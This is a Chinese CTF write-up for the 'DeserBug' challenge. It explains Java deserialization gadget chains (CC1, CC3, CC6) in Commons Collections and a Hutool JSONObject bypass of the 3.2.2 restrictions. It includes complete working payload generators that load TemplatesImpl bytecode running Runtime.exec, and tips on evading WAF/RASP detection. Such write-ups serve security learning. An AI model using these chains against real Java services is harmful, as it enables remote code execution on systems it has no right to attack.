# CTF - DeserBug

## 目录

- [题目分析](#题目分析)
- [漏洞分析](#漏洞分析)
- [CC链基础知识](#cc链基础知识)
  - [CC1链原理](#cc1链原理)
  - [CC3链原理](#cc3链原理)
  - [CC6链原理](#cc6链原理)
- [解题思路](#解题思路)
- [完整POC实现](#完整poc实现)
- [关键机制解析](#关键机制解析)
- [反序列化链拼接原理](#反序列化链拼接原理)

---

## 题目分析

### 题目环境

- **Web服务**: Hutool HTTP Server (端口8888)
- **依赖**: Commons Collections 3.2.2 (带安全检查) hutool-all-5.8.18
- **JDK**: JDK1.8.0_202
- **提示**: `cn.hutool.json.JSONObject.put` → `com.app.Myexpect#getAnyexcept`

### 题目提供的关键文件

#### 1. Testapp.java - 存在反序列化漏洞的Web服务

```java
public class Testapp {
    public static void main(String[] args) {
        HttpUtil.createServer(8888).addAction("/", (request, response) -> {
            String bugstr = request.getParam("bugstr");
            try {
                // 【漏洞点】直接反序列化用户输入
                byte[] decode = Base64.getDecoder().decode(bugstr);
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decode));
                Object object = ois.readObject();
                result = object.toString();
            } catch (Exception e) {
                // 【关键提示】异常处理中使用Myexpect
                Myexpect myexpect = new Myexpect();
                myexpect.setTypeparam(new Class[]{String.class});
                myexpect.setTypearg(new String[]{e.toString()});
                myexpect.setTargetclass(e.getClass());
                result = myexpect.getAnyexcept().toString();
            }
            response.write(result, ContentType.TEXT_PLAIN.toString());
        }).start();
    }
}
```

#### 2. Myexpect.java - 题目提供的反射工具类

```java
public class Myexpect extends Exception {
    private Class targetclass;      // 目标类
    private Class[] typeparam;      // 构造器参数类型
    private Object[] typearg;       // 构造器参数值
    
    // 【核心方法】通过反射调用任意构造器
    public Object getAnyexcept() throws Exception {
        Constructor con = targetclass.getConstructor(typeparam);
        return con.newInstance(typearg);
    }
    
    // Getter/Setter省略...
}
```

---

## 漏洞分析

### 漏洞点

```java
// Testapp.java - 反序列化入口
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(decode));
Object object = ois.readObject();  // 危险的反序列化操作
```

### 题目约束

Commons Collections 3.2.2 的安全限制：

- ❌ `InvokerTransformer` - 反射调用方法（已禁用）
- ❌ `InstantiateTransformer` - 反射调用构造器（已禁用）
- ✅ `ConstantTransformer` - 仅返回常量（可用）

### 突破点

题目提供的 `Myexpect` 类：

- ✅ 可序列化（继承自Exception）
- ✅ 提供 `getAnyexcept()` 方法反射调用任意构造器
- ✅ 不受CC 3.2.2安全检查限制

**关键提示**：`cn.hutool.json.JSONObject.put` → `com.app.Myexpect#getAnyexcept`

---

## CC链基础知识

本题目是基于经典的CC1、CC3和CC6链进行改造的CTF题目。理解原始链和改造思路是解题关键。

### CC1链原理

#### 核心组件

```java
// 使用 TransformedMap 在 setValue 时触发
Map innerMap = new HashMap();
innerMap.put("value", "test");
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};
Map transformedMap = TransformedMap.decorate(innerMap, null, new ChainedTransformer(transformers));

// 使用 AnnotationInvocationHandler 触发
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
Object obj = construct.newInstance(Retention.class, transformedMap);
```

#### 调用链

```
AnnotationInvocationHandler.readObject()
  → memberValues.entrySet()遍历
  → TransformedMap.setValue()  // 当key="value"时触发
    → ChainedTransformer.transform()
      → ConstantTransformer → 返回Runtime.class
      → InvokerTransformer链式调用
        → Runtime.getRuntime().exec() → RCE
```

#### 失效原因

**JDK 8u71+限制**：

```java
// AnnotationInvocationHandler.readObject() 在 JDK 8u71+ 中增加了类型检查
private void readObject(ObjectInputStream s) {
    // ...
    AnnotationType annotationType = null;
    try {
        annotationType = AnnotationType.getInstance(type);
    } catch(IllegalArgumentException e) {
        throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
    }
    
    Map<String, Class<?>> memberTypes = annotationType.memberTypes();
    for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
        String name = memberValue.getKey();
        Class<?> memberType = memberTypes.get(name);
        if (memberType != null) {  // ❌ 必须是注解的成员
            Object value = memberValue.getValue();
            if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) {
                memberValue.setValue(  // 只有这里会调用setValue
                    new AnnotationTypeMismatchExceptionProxy(
                        value.getClass() + "[" + value + "]"));
            }
        }
    }
}
```

- 只有当key是注解的合法成员时才会触发setValue
- @Retention注解只有value()成员，但value类型是RetentionPolicy枚举，类型不匹配时才会setValue
- 高版本JDK对此进行了严格限制，导致CC1失效

**CC 3.2.2限制**：

```java
// InvokerTransformer.readObject()
private void readObject(ObjectInputStream is) {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);  // ❌ 抛异常
}
```

---

### CC3链原理

#### 核心组件

```java
// 使用 InstantiateTransformer 调用构造器
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(
        new Class[]{Templates.class},
        new Object[]{templates}
    )
};

// 使用动态代理触发
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, new ChainedTransformer(transformers));

// AnnotationInvocationHandler作为InvocationHandler
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);

// 创建代理对象
Map proxyMap = (Map) Proxy.newProxyInstance(
    Map.class.getClassLoader(),
    new Class[]{Map.class},
    handler
);

// 再次封装
Object obj = construct.newInstance(Retention.class, proxyMap);
```

#### 调用链

```
AnnotationInvocationHandler.readObject()
  → memberValues.entrySet()  // memberValues是proxyMap
    → 代理对象方法调用
      → AnnotationInvocationHandler.invoke()
        → LazyMap.get()
          → ChainedTransformer.transform()
            → ConstantTransformer → 返回TrAXFilter.class
            → InstantiateTransformer.transform()
              → Constructor.newInstance(templates)  // 反射调用构造器
              → new TrAXFilter(templates)
                → templates.newTransformer() → RCE
```

#### CC 3.2.2失败原因

**CC 3.2.2限制**：

```java
// InstantiateTransformer.readObject()
private void readObject(ObjectInputStream is) {
    FunctorUtils.checkUnsafeSerialization(InstantiateTransformer.class);  // ❌ 抛异常
}
```

**JDK版本限制**：

虽然CC3使用动态代理绕过了JDK 8u71+对TransformedMap的限制，但在高版本JDK中，AnnotationInvocationHandler的invoke方法也被修改，导致LazyMap.get()无法被触发。本题目使用的是JDK 1.8.0_202，理论上CC3的触发方式仍然可用，但主要问题是InstantiateTransformer被禁用。

---

### CC6链原理

#### 核心组件

```java
// 使用 InvokerTransformer 直接反射调用方法
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", ...),    // 获取方法
    new InvokerTransformer("invoke", ...),       // 调用方法
    new InvokerTransformer("exec", ...)          // 执行命令
};

// 使用 HashMap + TiedMapEntry + LazyMap 触发
HashMap hashMap = new HashMap();
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
hashMap.put(entry, "value");
```

#### 调用链

```
HashMap.readObject()
  → hash(key)
    → TiedMapEntry.hashCode()
      → getValue()
        → LazyMap.get(key)
          → ChainedTransformer.transform()
            → InvokerTransformer链式调用 → Runtime.exec() → RCE
```

#### CC 3.2.2失败原因

```java
// InvokerTransformer.readObject()
private void readObject(ObjectInputStream is) {
    FunctorUtils.checkUnsafeSerialization(InvokerTransformer.class);  // ❌ 抛异常
}
```

---

### CC1/CC3/CC6核心区别对比表

| 特性 | CC1 | CC3 | CC6 |
|------|-----|-----|-----|
| **Commons Collections版本** | ≤3.2.1 | ≤3.2.1 | ≤3.2.1 |
| **JDK版本限制** | ≤JDK 8u71 | 8u71+可用（部分版本） | 无限制 |
| **触发类** | AnnotationInvocationHandler | AnnotationInvocationHandler | HashMap |
| **触发方式** | TransformedMap.setValue() | 动态代理 + LazyMap.get() | TiedMapEntry.hashCode() → LazyMap.get() |
| **核心Transformer** | InvokerTransformer | InstantiateTransformer | InvokerTransformer |
| **攻击目标** | Runtime.exec() | TrAXFilter → TemplatesImpl | Runtime.exec() |
| **优点** | 简单直接 | 绕过JDK 8u71限制，字节码加载隐蔽 | JDK兼容性最好 |
| **缺点** | JDK 8u71+失效 | 高版本JDK可能失效 | 直接调用Runtime易被拦截 |
| **失效原因** | memberValues类型检查 | InstantiateTransformer被禁用 | InvokerTransformer被禁用 |

**关键发现**：

- CC1 → CC3：为了绕过JDK 8u71+对TransformedMap的限制，改用动态代理触发LazyMap
- CC3 → CC6：为了彻底摆脱AnnotationInvocationHandler的JDK版本限制，改用HashMap触发

---

## 解题思路

### 核心思路

使用 `Myexpect` 替代被禁用的 `InstantiateTransformer`，利用 Hutool JSONObject 的 JSON 序列化机制自动触发 getter 方法。

### 技术选型

| 组件 | 选择 | 原因 |
|------|------|------|
| 触发方式 | CC6 (HashMap + TiedMapEntry + LazyMap) | JDK通用，触发稳定 |
| 攻击目标 | CC3 (TrAXFilter + TemplatesImpl) | 构造器触发，适配Myexpect |
| 绕过手段 | ConstantTransformer + JSONObject | 返回Myexpect对象，JSON序列化触发getter |

### 完整利用链

```
HashMap.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get(key)
      → ConstantTransformer.transform()  // 返回Myexpect对象
        → JSONObject.put(key, myexpect)  // JSON序列化触发
          → Myexpect.getAnyexcept()      // 反射调用构造器
            → new TrAXFilter(templates)
              → TemplatesImpl.newTransformer()
                → 加载恶意字节码 → RCE ✅
```

---

## 完整POC实现

```java
public class MyPOC {
    public static void main(String[] args) throws Exception {
        // 准备TemplatesImpl字节码
        byte[] bytes = getTemplates();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "1");
        setFieldValue(templates, "_bytecodes", new byte[][]{bytes});
        
        // 配置Myexpect调用TrAXFilter构造器
        Myexpect myexpect = new Myexpect();
        myexpect.setTargetclass(TrAXFilter.class);
        myexpect.setTypeparam(new Class[]{Templates.class});
        myexpect.setTypearg(new Object[]{templates});
        
        // 构造LazyMap触发链
        JSONObject jsonObject = new JSONObject();
        ConstantTransformer transformer = new ConstantTransformer(1);
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(jsonObject, transformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "111");
        
        // HashMap触发 + 时序控制
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "1");
        jsonObject.remove("111");  // 确保反序列化时触发
        setFieldValue(transformer, "iConstant", myexpect);
        
        // 生成payload
        byte[] serialize = serialize(hashMap);
        System.out.println(Base64.getEncoder().encodeToString(serialize));
    }
    
    public static byte[] getTemplates() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass template = pool.makeClass("Test");
        template.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        String block = "Runtime.getRuntime().exec(\"calc\");";
        template.makeClassInitializer().insertBefore(block);
        return template.toBytecode();
    }
}
```

---

## 关键机制解析

### 1. JSONObject.put 触发 getAnyexcept()

**核心原理**：Hutool JSONObject.put() 会调用 BeanUtil.beanToMap()，自动反射调用对象的所有getter方法。

```java
LazyMap.get("111")
  → transformer.transform("111")  // 返回Myexpect对象
    → jsonObject.put("111", myexpect)  // JSONObject序列化
      → getAnyexcept() 被自动调用！
```

**关键**：使用JSONObject而非普通HashMap作为LazyMap底层Map。

### 2. jsonObject.remove("111") 的作用

确保反序列化时触发transform：

- 构造时：`hashMap.put()` → `jsonObject.put("111", 1)`
- 清理：`jsonObject.remove("111")`
- 反序列化：`lazyMap.get("111")` → `!containsKey("111")` → 调用`transform()`

**不remove则**：LazyMap直接返回已存在值，不触发transform。

### 3. 为什么选择 TrAXFilter + TemplatesImpl

**Myexpect限制**：只能调用构造器，不能调用普通方法。

**TrAXFilter优势**：

```java
public TrAXFilter(Templates templates) {
    _transformer = templates.newTransformer();  // 构造器中自动触发
}
```

- Runtime构造器是private的 ❌
- TrAXFilter构造器是public的，且内部自动调用newTransformer() ✅

---

## 反序列化链拼接原理

### 链的基本结构

任何反序列化攻击链都可以分解为三个独立模块：

```
[触发器 Trigger] → [传递机制 Chain] → [攻击目标 Sink]
       ↓                 ↓                  ↓
    入口点          Transformer          危险操作
```

### 常见组件分类

#### 1. 触发器（Trigger）- 决定何时执行

| 触发器 | 入口方法 | JDK要求 |
|--------|---------|---------|--------|
| **HashMap** | readObject() → hash() → hashCode() | 任意版本 |
| **PriorityQueue** | readObject() → heapify() → compare() | 任意版本 |
| **BadAttributeValueExpException** | readObject() → toString() | 任意版本 |
| **AnnotationInvocationHandler** | readObject() → entrySet() → setValue() | ≤JDK 8u71 |

#### 2. 传递机制（Chain）- 如何传递到目标

| 传递机制 | 特点 | CC版本要求 |
|---------|------|-----------|
| **LazyMap** | 延迟加载，访问不存在的key触发 | 任意版本 |
| **TransformedMap** | 修改value时触发 | 任意版本 |
| **ChainedTransformer** | 链式调用多个Transformer | 任意版本 |
| **InvokerTransformer** | 反射调用方法 | ≤3.2.1 |
| **InstantiateTransformer** | 反射调用构造器 | ≤3.2.1 |
| **ConstantTransformer** | 返回常量 | 任意版本 |

#### 3. 攻击目标（Sink）- 最终执行什么

| 攻击目标 | 触发方式 | 特点 |
|---------|---------|------|
| **Runtime.exec()** | 方法调用 | 直接但容易被拦截 |
| **TemplatesImpl字节码** | 构造器或方法触发 | 隐蔽，绕过SecurityManager |
| **URLClassLoader** | 加载远程类 | 需要网络访问 |
| **JNDI注入** | lookup()调用 | 强大但有JDK版本限制 |

---

### 拼接三原则

#### 原则1：接口匹配

触发器必须能调用传递机制的入口方法

```java
// ✅ 正确：HashMap.hash() 调用 TiedMapEntry.hashCode()
HashMap → TiedMapEntry.hashCode() → LazyMap.get()

// ❌ 错误：HashMap不会调用toString()
HashMap → BadAttributeValueExpException.toString()  // 不匹配！
```

#### 原则2：参数兼容

上一步的输出必须是下一步的输入

```java
// ✅ 正确：transform()接受Object返回Object，可以链式调用
ConstantTransformer.transform()  → 返回 TrAXFilter.class (Object)
  ↓
InstantiateTransformer.transform(Object)  → 接受 Class 对象

// ❌ 错误：类型不匹配
ConstantTransformer → 返回String
  ↓
InstantiateTransformer → 需要Class对象  // 类型不匹配！
```

#### 原则3：版本限制

检查每个组件的可用性

```java
// CC 3.2.2 环境
✅ LazyMap、ConstantTransformer、HashMap  // 可用
❌ InvokerTransformer、InstantiateTransformer  // 被禁用
```

---

### 经典组合示例

#### 组合1：CC6 = HashMap触发 + InvokerTransformer链 + Runtime.exec()

```java
// [触发器] HashMap
HashMap hashMap = new HashMap();
TiedMapEntry entry = new TiedMapEntry(lazyMap, "key");
hashMap.put(entry, "value");

// [传递机制] LazyMap + InvokerTransformer链
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", ...),
    new InvokerTransformer("invoke", ...),
    new InvokerTransformer("exec", ...)
};
LazyMap lazyMap = LazyMap.decorate(new HashMap(), new ChainedTransformer(transformers));

// [攻击目标] Runtime.exec()
// 调用链：
// HashMap.readObject() → TiedMapEntry.hashCode() → LazyMap.get() 
// → ChainedTransformer → Runtime.exec()
```

#### 组合2：CC1 = TransformedMap触发 + InvokerTransformer + Runtime.exec()

```java
// [触发器] AnnotationInvocationHandler + TransformedMap
Map<String, Object> innerMap = new HashMap<>();
innerMap.put("value", "test");
Map transformedMap = TransformedMap.decorate(innerMap, null, chainedTransformer);

// [传递机制] InvokerTransformer
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
};

// [攻击目标] Runtime.exec()
// 调用链：
// AnnotationInvocationHandler.readObject() → TransformedMap.setValue()
// → ChainedTransformer → InvokerTransformer链
// → Runtime.getRuntime().exec() → RCE
```

#### 组合3：CC3 = 动态代理触发 + InstantiateTransformer + TemplatesImpl

```java
// [触发器] AnnotationInvocationHandler + 动态代理 + LazyMap
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, lazyMap);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

// [传递机制] InstantiateTransformer
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(TrAXFilter.class),
    new InstantiateTransformer(
        new Class[]{Templates.class},
        new Object[]{templates}
    )
};

// [攻击目标] TemplatesImpl字节码加载
// 调用链：
// AnnotationInvocationHandler.readObject() → proxyMap.entrySet()
// → 动态代理invoke() → LazyMap.get() → ChainedTransformer → InstantiateTransformer 
// → new TrAXFilter(templates) → templates.newTransformer() → 字节码加载
```

#### 组合4：CC6触发 + CC3攻击（完整实现）

这个组合结合了CC6的稳定触发和CC3的隐蔽攻击，是理论上的最优组合。

```java
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class CC6TriggerCC3Attack {
    public static void main(String[] args) throws Exception {
        // 1. 准备恶意字节码 - 使用TemplatesImpl
        byte[] code = getEvilBytecode();
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_bytecodes", new byte[][]{code});
        setFieldValue(templates, "_tfactory", null);

        // 2. 构造Transformer链 - 使用CC3的InstantiateTransformer
        Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                new Class[]{Templates.class},
                new Object[]{templates}
            )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 3. 构造LazyMap - 延迟触发
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);

        // 4. 使用CC6的HashMap触发方式
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "value");
        
        // 清理LazyMap，确保反序列化时重新触发
        lazyMap.clear();

        // 5. 序列化
        byte[] payload = serialize(hashMap);
        System.out.println("Payload (Base64): " + Base64.getEncoder().encodeToString(payload));

        // 6. 反序列化测试
        System.out.println("\n[*] 触发反序列化...");
        deserialize(payload);
    }

    // 生成恶意字节码
    public static byte[] getEvilBytecode() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("EvilClass");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        
        // 静态代码块中执行命令
        String cmd = "Runtime.getRuntime().exec(\"calc\");";
        ctClass.makeClassInitializer().insertBefore(cmd);
        
        return ctClass.toBytecode();
    }

    // 反射设置字段值
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    // 序列化
    public static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj);
        oos.close();
        return baos.toByteArray();
    }

    // 反序列化
    public static Object deserialize(byte[] bytes) throws Exception {
        ByteArrayInputStream bais = new ByteArrayInputStream(bytes);
        ObjectInputStream ois = new ObjectInputStream(bais);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

**完整调用链**：

```
HashMap.readObject()                      ← CC6的触发器（最稳定）
  ↓
hash(tiedMapEntry)
  ↓
TiedMapEntry.hashCode()
  ↓
TiedMapEntry.getValue()
  ↓
LazyMap.get("key")
  ↓
ChainedTransformer.transform()
  ↓
ConstantTransformer.transform()           → 返回TrAXFilter.class
  ↓
InstantiateTransformer.transform()        ← CC3的传递机制
  ↓
new TrAXFilter(templates)                 ← CC3的攻击目标（构造器触发）
  ↓
templates.newTransformer()
  ↓
TemplatesImpl.getTransletInstance()
  ↓
TemplatesImpl.defineTransletClasses()
  ↓
加载恶意字节码 → 静态代码块执行 → RCE ✅
```

**为什么这样组合？**

- **稳定性**：HashMap触发不依赖JDK版本，比AnnotationInvocationHandler更通用
- **隐蔽性**：TemplatesImpl字节码加载比Runtime.exec()更难被WAF/RASP检测
- **绕过能力**：可绕过SecurityManager和部分安全防护

**注意**：此组合在CC 3.2.1及以下版本可用，CC 3.2.2中InstantiateTransformer被禁用，需要用本题的Myexpect方式绕过。

---

### 实战拼接步骤

#### 步骤1：确定环境约束

```java
// 检查清单
□ JDK版本？
□ Commons Collections版本？
□ 是否有SecurityManager？
□ 是否有其他防护措施？
```

#### 步骤2：选择触发器

```java
// 优先级
1. HashMap（最通用）
2. PriorityQueue（需要Comparator）
3. BadAttributeValueExpException（依赖toString）
```

#### 步骤3：选择攻击目标

```java
// 根据环境选择
if (需要绕过SecurityManager) {
    使用 TemplatesImpl字节码加载
} else if (简单直接) {
    使用 Runtime.exec()
}
```

#### 步骤4：构建传递链

```java
// 根据约束选择
if (CC版本 <= 3.2.1) {
    可用 InvokerTransformer、InstantiateTransformer
} else {
    只能用 ConstantTransformer + 自定义类（如Myexpect）
}
```

#### 步骤5：测试验证

```java
// 1. 本地测试序列化
byte[] payload = serialize(gadget);

// 2. 反序列化验证
deserialize(payload);  // 观察是否触发

// 3. 调试跟踪
// 在关键方法打断点，确认调用链正确
```

---

### 拼接核心思路总结

1. **模块化思维**：把链分解为触发、传递、攻击三个独立模块
2. **接口匹配**：确保上下游方法能正确调用
3. **灵活组合**：取不同链的优点进行组合
4. **创新绕过**：遇到限制时寻找替代方案

**记住**：反序列化链不是固定的，可以像乐高积木一样自由拼接。关键是理解每个组件的功能和接口，然后根据环境约束进行创新组合。
